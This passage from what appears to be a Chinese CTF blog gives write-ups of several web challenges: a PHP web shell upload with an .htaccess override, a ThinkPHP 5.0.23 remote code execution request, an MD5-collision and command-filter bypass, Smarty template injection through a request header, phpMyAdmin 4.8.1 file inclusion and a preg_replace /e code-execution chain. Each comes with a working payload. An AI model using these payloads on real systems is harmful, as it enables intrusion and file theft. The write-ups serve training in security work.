die(&amp;#34;还想读flag，臭弟弟！&amp;#34;);
}
}
// highlight_file(__FILE__);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正则表达式匹配的只有函数的形式如&lt;code&gt;var_dump();&lt;/code&gt;是一道&lt;a class="link" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener"
&gt;无参数RCE&lt;/a&gt;，看的题解自己整理的payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一层一层解释：&lt;/p&gt;
&lt;p&gt;localeconv() 函数返回一包含本地数字及货币格式信息的数组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图片展示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;current() 返回数组中的当前单元, 默认取第一个值。别名pos()&lt;/p&gt;
&lt;p&gt;到这里获得的是一个点&lt;/p&gt;
&lt;p&gt;scandir() 遍历目录，是&lt;code&gt;.&lt;/code&gt;的话就是列出当前目录。&lt;/p&gt;
&lt;p&gt;此时输出：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;array(5) { [0]=&amp;gt; string(1) &amp;#34;.&amp;#34; [1]=&amp;gt; string(2) &amp;#34;..&amp;#34; [2]=&amp;gt; string(4) &amp;#34;.git&amp;#34; [3]=&amp;gt; string(8) &amp;#34;flag.php&amp;#34; [4]=&amp;gt; string(9) &amp;#34;index.php&amp;#34; }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时的输出还是键值对的形式，我们需要使用&lt;code&gt;array_flip()&lt;/code&gt;函数交换键值对，然后使用随机函数&lt;code&gt;array_rand()&lt;/code&gt;从数组中随机取出一个或多个单元。因为正则的原因无法使用&lt;code&gt;file_get_contents()&lt;/code&gt;，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gxyctf2019babyupload"&gt;[GXYCTF2019]BabyUpload
&lt;/h1&gt;&lt;p&gt;ph过滤，image/gif不能通过。image/jpe可以&lt;/p&gt;
&lt;p&gt;上传.htaccess&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传码，但是不能是php代码，使用js&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完工&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndold-hack"&gt;[BJDCTF 2nd]old-hack
&lt;/h1&gt;&lt;p&gt;ThinkPHP的&lt;a class="link" href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener"
&gt;漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP5 5.0.23&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="安洵杯-2019easy_web"&gt;[安洵杯 2019]easy_web
&lt;/h1&gt;&lt;p&gt;看url一个img和cmd，页面中有一个图片的标签，和一个&lt;strong&gt;md5 is funny ~&lt;/strong&gt;。把url中img的值进行解码发现图片名为&lt;code&gt;555.png&lt;/code&gt;，尝试用同样的编码方式读取index.php，加密的编码依次为：hex&amp;ndash;&amp;gt;base64&amp;ndash;&amp;gt;base64。&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&amp;#39;content-type:text/html;charset=utf-8&amp;#39;);
$cmd = $_GET[&amp;#39;cmd&amp;#39;];
if (!isset($_GET[&amp;#39;img&amp;#39;]) || !isset($_GET[&amp;#39;cmd&amp;#39;]))
header(&amp;#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&amp;#39;img&amp;#39;])));
$file = preg_replace(&amp;#34;/[^a-zA-Z0-9.]+/&amp;#34;, &amp;#34;&amp;#34;, $file);
if (preg_match(&amp;#34;/flag/i&amp;#34;, $file)) {
echo &amp;#39;&amp;lt;img src =&amp;#34;./ctf3.jpeg&amp;#34;&amp;gt;&amp;#39;;
die(&amp;#34;xixi～ no flag&amp;#34;);
} else {
$txt = base64_encode(file_get_contents($file));
echo &amp;#34;&amp;lt;img src=&amp;#39;data:image/gif;base64,&amp;#34; . $txt . &amp;#34;&amp;#39;&amp;gt;&amp;lt;/img&amp;gt;&amp;#34;;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
}
echo $cmd;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
if (preg_match(&amp;#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#39;|\&amp;#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;#34;, $cmd)) {
echo(&amp;#34;forbid ~&amp;#34;);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
} else {
if ((string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;])) {
echo `$cmd`;
} else {
echo (&amp;#34;md5 is funny ~&amp;#34;);
}
}
?&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;style&amp;gt;
body{
background:url(./bj.png) no-repeat center center;
background-size:cover;
background-attachment:fixed;
background-color:#CCCCCC;
}
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我不知道为什么，我的bp一定要在&lt;code&gt;&amp;amp;&lt;/code&gt;前加一个空格才可以通过。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?cmd=uniq%20/flag
POST
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读文件的绕过有&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center"&gt;1&lt;/th&gt;
&lt;th&gt;more:一页一页的显示档案内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;2&lt;/td&gt;
&lt;td&gt;less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;3&lt;/td&gt;
&lt;td&gt;head:查看头几行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;4&lt;/td&gt;
&lt;td&gt;tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;5&lt;/td&gt;
&lt;td&gt;tail:查看尾几行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;6&lt;/td&gt;
&lt;td&gt;nl：显示的时候，顺便输出行号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;7&lt;/td&gt;
&lt;td&gt;od:以二进制的方式读取档案内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;8&lt;/td&gt;
&lt;td&gt;vi:一种编辑器，这个也可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;9&lt;/td&gt;
&lt;td&gt;vim:一种编辑器，这个也可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;10&lt;/td&gt;
&lt;td&gt;sort:可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;11&lt;/td&gt;
&lt;td&gt;uniq:可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;12&lt;/td&gt;
&lt;td&gt;file -f:报错出具体内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/blockquote&gt;
&lt;p&gt;摘自&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;命令执行漏洞利用及绕过方式总结&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020mark-loves-cat"&gt;[BJDCTF2020]Mark loves cat
&lt;/h1&gt;&lt;p&gt;git泄露&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$flag = file_get_contents(&amp;#39;/flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
$yds = &amp;#34;dog&amp;#34;;
$is = &amp;#34;cat&amp;#34;;
$handsome = &amp;#39;yds&amp;#39;;
foreach($_POST as $x =&amp;gt; $y){
$$x = $y;
}
foreach($_GET as $x =&amp;gt; $y){
$$x = $$y;
}
foreach($_GET as $x =&amp;gt; $y){
if($_GET[&amp;#39;flag&amp;#39;] === $x &amp;amp;&amp;amp; $x !== &amp;#39;flag&amp;#39;){
exit($handsome);
}
}
if(!isset($_GET[&amp;#39;flag&amp;#39;]) &amp;amp;&amp;amp; !isset($_POST[&amp;#39;flag&amp;#39;])){
exit($yds);
}
if($_POST[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39; || $_GET[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39;){
exit($is);
}
echo &amp;#34;the flag is: &amp;#34;.$flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试输出&lt;code&gt;$flag&lt;/code&gt;即可。exit()函数退出时也会输出。&lt;/p&gt;
&lt;p&gt;第一个不可能实现，如果POST或GET传入flag的话必然导致&lt;code&gt;$flag&lt;/code&gt;修改，那么正好符合第二个if。&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET
?yds=flag
POST(任意，但是需要保证不传flag)
is=233flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020the-mystery-of-ip"&gt;[BJDCTF2020]The mystery of ip
&lt;/h1&gt;&lt;p&gt;hint.php里面有注释&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do you know why i know your ip?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。&lt;/p&gt;
&lt;p&gt;尝试了几个ssti的payload不行，但是提示了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Uncaught &amp;ndash;&amp;gt; Smarty Compiler:&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;请求：
X-Forwarded-For: {system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class="link" href="https://github.com/epinna/tplmap" target="_blank" rel="noopener"
&gt;SSTI神器–Tplmap&lt;/a&gt;，看介绍是和sqlmap差不多的工具。&lt;/p&gt;
&lt;p&gt;这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener"
&gt;CTF SSTI(服务器模板注入)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3679/" target="_blank" rel="noopener"
&gt;flask之ssti模版注入从零到入门&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gwctf-2019我有一个数据库"&gt;[GWCTF 2019]我有一个数据库
&lt;/h1&gt;&lt;p&gt;页面是乱码，想知道内容了可以看下图&lt;/p&gt;
&lt;p&gt;$$各种乱码图&lt;/p&gt;
&lt;p&gt;对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存&amp;ndash;&amp;gt;GBK，再通过编码打开&amp;ndash;&amp;gt;UTF-8。内容如下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一个数据库，但里面什么也没有~
不信你找&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.secpulse.com/archives/72817.html" target="_blank" rel="noopener"
&gt;phpmyadmin4.8.1后台getshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210301"&gt;2021.03.01
&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020zjctf不过如此"&gt;[BJDCTF2020]ZJCTF，不过如此
&lt;/h1&gt;&lt;p&gt;绕过&lt;/p&gt;
&lt;p&gt;第一层用php伪协议中的data封装流。&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHP伪协议总结&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,I have a dream&amp;amp;file=php://filter/convert.base64-encode/resource=next.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读出来的next.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64解码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$id = $_GET[&amp;#39;id&amp;#39;];
$_SESSION[&amp;#39;id&amp;#39;] = $id;
function complex($re, $str) {
return preg_replace(
&amp;#39;/(&amp;#39; . $re . &amp;#39;)/ei&amp;#39;,
&amp;#39;strtolower(&amp;#34;\\1&amp;#34;)&amp;#39;,
$str
);
}
foreach($_GET as $re =&amp;gt; $str) {
echo complex($re, $str). &amp;#34;\n&amp;#34;;
}
function getFlag(){
@eval($_GET[&amp;#39;cmd&amp;#39;]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里想要通过需要知道一个&lt;a class="link" href="http://www.xinyueseo.com/websecurity/158.html" target="_blank" rel="noopener"
&gt;深入研究 preg_replace /e 模式下的代码漏洞问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;next.php?\S*=${getFlag()}&amp;amp;cmd=system(&amp;#39;cat /flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="de1ctf-2019ssrf-me"&gt;[De1CTF 2019]SSRF Me
&lt;/h1&gt;&lt;p&gt;进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# encoding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; request
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; urllib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;reload(sys)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;setdefaultencoding(&lt;span style="color:#e6db74"&gt;&amp;#39;latin1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;app &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Flask(__name__)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;secert_key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;urandom(&lt;span style="color:#ae81ff"&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Task&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, action, param, sign, ip):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action &lt;span style="color:#f92672"&gt;=&lt;/span&gt; action
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param &lt;span style="color:#f92672"&gt;=&lt;/span&gt; param
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sign &lt;span style="color:#f92672"&gt;=&lt;/span&gt; sign
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; md5(ip)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;not&lt;/span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;path&lt;span style="color:#f92672"&gt;.&lt;/span&gt;exists(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)): &lt;span style="color:#75715e"&gt;# SandBox For Remote_Addr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; os&lt;span style="color:#f92672"&gt;.&lt;/span&gt;mkdir(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exec&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;checkSign()):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;scan&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; resp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; scan(self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;param) &lt;span style="color:#75715e"&gt;# 此处是文件读取得注入点&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (resp &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Connection Timeout&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print resp
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(resp)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tmpfile&lt;span style="color:#f92672"&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;read&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;action:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; f &lt;span style="color:#f92672"&gt;=&lt;/span&gt; open(&lt;span style="color:#e6db74"&gt;&amp;#34;./&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%s&lt;/span&gt;&lt;span style="color:#e6db74"&gt;/result.txt&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sandbox, &lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; f&lt;span style="color:#f92672"&gt;.&lt;/span&gt;read()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;code&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result[&lt;span style="color:#e6db74"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;Action Error&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
